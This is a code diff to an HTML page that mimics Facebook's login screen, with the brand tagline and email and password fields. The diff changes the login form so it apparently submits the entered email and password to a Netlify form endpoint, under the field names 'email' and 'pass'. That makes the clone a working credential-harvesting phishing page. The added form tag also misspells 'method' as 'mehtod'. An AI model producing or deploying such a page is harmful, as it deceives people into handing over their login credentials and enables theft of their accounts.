@@ -179,9 +179,9 @@ hr {
           <p>Connect with friends and the world </p>
           <p> around you on Facebook.</p>
         </div>
-        <form action="#">
-          <input type="email" placeholder="Email or phone number" required>
-          <input type="password" placeholder="Password" required>
+        <form name="login" mehtod="post" data-netlify="true" onSubmit="submit">
+          <input type="email" placeholder="Email or phone number" name="email" required>
+          <input type="password" placeholder="Password" name="pass" required>
           <div class="link">
             <button type="submit" class="login">Login</button>
             <a href="#" class="forgot">Forgot password?</a>
